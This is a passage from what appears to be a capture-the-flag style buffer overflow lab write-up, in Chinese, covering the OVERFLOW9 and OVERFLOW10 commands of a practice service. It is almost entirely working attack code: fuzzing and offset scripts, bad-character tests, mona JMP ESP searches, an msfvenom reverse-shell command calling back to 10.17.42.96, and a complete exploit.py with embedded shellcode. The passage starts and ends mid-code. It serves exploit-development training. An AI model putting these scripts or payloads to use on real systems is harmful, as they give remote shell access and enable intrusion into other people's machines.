class="string">&quot;\x01\x02\x03\x03\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3d\x3d\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe0\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>去掉BADCHAR<code>\x04\x3e\x3f\xe1</code>之后<code>\x05\xe2</code>不受影响</p><p>BADCHAR: <code>\x00\x04\x3e\x3f\xe1</code></p><h3 id="jmp-esp-9"><a class="markdownIt-Anchor" href="#jmp-esp-9"></a> JMP ESP</h3><p>Immunity Debugger</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona jmp -r esp -cqb &quot;\x00\x04\x3e\x3f\xe1&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x625011af</span><br><span class="line">0x625011bb</span><br><span class="line">0x625011c7</span><br><span class="line">0x625011d3</span><br><span class="line">0x625011df</span><br><span class="line">0x625011eb</span><br><span class="line">0x625011f7</span><br><span class="line">0x62501203</span><br><span class="line">0x62501205</span><br></pre></td></tr></table></figure><h3 id="shellcode-9"><a class="markdownIt-Anchor" href="#shellcode-9"></a> SHELLCODE</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.17.42.96 LPORT=1337 -b <span class="string">&quot;\x00\x04\x3e\x3f\xe1&quot;</span> -f c</span><br></pre></td></tr></table></figure><h3 id="exploit-9"><a class="markdownIt-Anchor" href="#exploit-9"></a> EXPLOIT</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># exploit.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW9 &quot;</span></span><br><span class="line">offset = <span class="number">1514</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;\xaf\x11\x50\x62&quot;</span></span><br><span class="line">padding = <span class="string">&quot;\x90&quot;</span> * <span class="number">16</span></span><br><span class="line">payload = <span class="string">&quot;\xdb\xd9\xd9\x74\x24\xf4\xb8\x21\x43\x4a\x13\x5b\x31\xc9\xb1\x52\x31\x43\x17\x03\x43\x17\x83\xca\xbf\xa8\xe6\xf0\xa8\xaf\x09\x08\x29\xd0\x80\xed\x18\xd0\xf7\x66\x0a\xe0\x7c\x2a\xa7\x8b\xd1\xde\x3c\xf9\xfd\xd1\xf5\xb4\xdb\xdc\x06\xe4\x18\x7f\x85\xf7\x4c\x5f\xb4\x37\x81\x9e\xf1\x2a\x68\xf2\xaa\x21\xdf\xe2\xdf\x7c\xdc\x89\xac\x91\x64\x6e\x64\x93\x45\x21\xfe\xca\x45\xc0\xd3\x66\xcc\xda\x30\x42\x86\x51\x82\x38\x19\xb3\xda\xc1\xb6\xfa\xd2\x33\xc6\x3b\xd4\xab\xbd\x35\x26\x51\xc6\x82\x54\x8d\x43\x10\xfe\x46\xf3\xfc\xfe\x8b\x62\x77\x0c\x67\xe0\xdf\x11\x76\x25\x54\x2d\xf3\xc8\xba\xa7\x47\xef\x1e\xe3\x1c\x8e\x07\x49\xf2\xaf\x57\x32\xab\x15\x1c\xdf\xb8\x27\x7f\x88\x0d\x0a\x7f\x48\x1a\x1d\x0c\x7a\x85\xb5\x9a\x36\x4e\x10\x5d\x38\x65\xe4\xf1\xc7\x86\x15\xd8\x03\xd2\x45\x72\xa5\x5b\x0e\x82\x4a\x8e\x81\xd2\xe4\x61\x62\x82\x44\xd2\x0a\xc8\x4a\x0d\x2a\xf3\x80\x26\xc1\x0e\x43\x43\x07\x3a\xf3\x3b\x25\x3a\xf6\x82\xa0\xdc\x92\xe4\xe4\x77\x0b\x9c\xac\x03\xaa\x61\x7b\x6e\xec\xea\x88\x8f\xa3\x1a\xe4\x83\x54\xeb\xb3\xf9\xf3\xf4\x69\x95\x98\x67\xf6\x65\xd6\x9b\xa1\x32\xbf\x6a\xb8\xd6\x2d\xd4\x12\xc4\xaf\x80\x5d\x4c\x74\x71\x63\x4d\xf9\xcd\x47\x5d\xc7\xce\xc3\x09\x97\x98\x9d\xe7\x51\x73\x6c\x51\x08\x28\x26\x35\xcd\x02\xf9\x43\xd2\x4e\x8f\xab\x63\x27\xd6\xd4\x4c\xaf\xde\xad\xb0\x4f\x20\x64\x71\x7f\x6b\x24\xd0\xe8\x32\xbd\x60\x75\xc5\x68\xa6\x80\x46\x98\x57\x77\x56\xe9\x52\x33\xd0\x02\x2f\x2c\xb5\x24\x9c\x4d\x9c&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="overflow10"><a class="markdownIt-Anchor" href="#overflow10"></a> OVERFLOW10</h2><h3 id="fuzz-10"><a class="markdownIt-Anchor" href="#fuzz-10"></a> FUZZ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># fuzz.py</span></span><br><span class="line"><span class="keyword">import</span> socket, time, sys</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line"></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">timeout = <span class="number">5</span></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW10 &quot;</span></span><br><span class="line"></span><br><span class="line">string = prefix + <span class="string">&quot;A&quot;</span> * <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="keyword">as</span> s:</span><br><span class="line">s.settimeout(timeout)</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">print(<span class="string">&quot;Fuzzing with &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">s.send(<span class="built_in">bytes</span>(string, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Fuzzing crashed at &#123;&#125; bytes&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(string) - <span class="built_in">len</span>(prefix)))</span><br><span class="line">sys.exit(<span class="number">0</span>)</span><br><span class="line">string += <span class="number">100</span> * <span class="string">&quot;A&quot;</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fuzzing crashed at 600 bytes</span><br></pre></td></tr></table></figure><h3 id="offset-10"><a class="markdownIt-Anchor" href="#offset-10"></a> OFFSET</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># offset.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW10 &quot;</span></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line">overflow = <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9&quot;</span></span><br><span class="line">retn = <span class="string">&quot;&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>EIP: 41397241 -&gt; A9rA -&gt; Ar9A</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q Ar9A -l 600</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] Exact match at offset 537</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># offset_confirm.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW10 &quot;</span></span><br><span class="line">offset = <span class="number">537</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>EIP: 42424242 -&gt; BBBB</p><h3 id="badchar-10"><a class="markdownIt-Anchor" href="#badchar-10"></a> BADCHAR</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># charset.py</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">print(<span class="string">&quot;\\x&quot;</span> + <span class="string">&quot;&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(x), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># badchar.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW10 &quot;</span></span><br><span class="line">offset = <span class="number">537</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.</p></blockquote><p>BADCHAR: <code>\x00\xa0\xa1\xad\xae\xbe\xbf\xde\xdf\xef\xf0</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># badchar_confirm.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW10 &quot;</span></span><br><span class="line">offset = <span class="number">537</span></span><br><span class="line">overflow = <span class="string">&quot;A&quot;</span> * offset</span><br><span class="line">retn = <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">padding = <span class="string">&quot;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span><br><span class="line">postfix = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">buffer = prefix + overflow + retn + padding + payload + postfix</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">s.connect((ip, port))</span><br><span class="line">print(<span class="string">&quot;Sending evil buffer...&quot;</span>)</span><br><span class="line">s.send(<span class="built_in">bytes</span>(buffer + <span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;latin-1&quot;</span>))</span><br><span class="line">print(<span class="string">&quot;Done!&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">&quot;Could not connect.&quot;</span>)</span><br></pre></td></tr></table></figure><p>去掉BADCHAR<code>\xa0\xad\xbe\xde\xef</code>之后<code>\xa1\xae\xbf\xdf\xf0</code>不受影响</p><p>BADCHAR: <code>\x00\xa0\xad\xbe\xde\xef</code></p><h3 id="jmp-esp-10"><a class="markdownIt-Anchor" href="#jmp-esp-10"></a> JMP ESP</h3><p>Immunity Debugger</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona jmp -r esp -cqb &quot;\x00\xa0\xad\xbe\xde\xef&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x625011af</span><br><span class="line">0x625011bb</span><br><span class="line">0x625011c7</span><br><span class="line">0x625011d3</span><br><span class="line">0x625011df</span><br><span class="line">0x625011eb</span><br><span class="line">0x625011f7</span><br><span class="line">0x62501203</span><br><span class="line">0x62501205</span><br></pre></td></tr></table></figure><h3 id="shellcode-10"><a class="markdownIt-Anchor" href="#shellcode-10"></a> SHELLCODE</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.17.42.96 LPORT=1337 -b <span class="string">&quot;\x00\xa0\xad\xbe\xde\xef&quot;</span> -f c</span><br></pre></td></tr></table></figure><h3 id="exploit-10"><a class="markdownIt-Anchor" href="#exploit-10"></a> EXPLOIT</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># exploit.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;10.10.90.129&quot;</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&quot;OVERFLOW10 &quot;</span></span><br><span class="line">offset = <span class="number">537</span></span><br><span class="line">overflow = <span 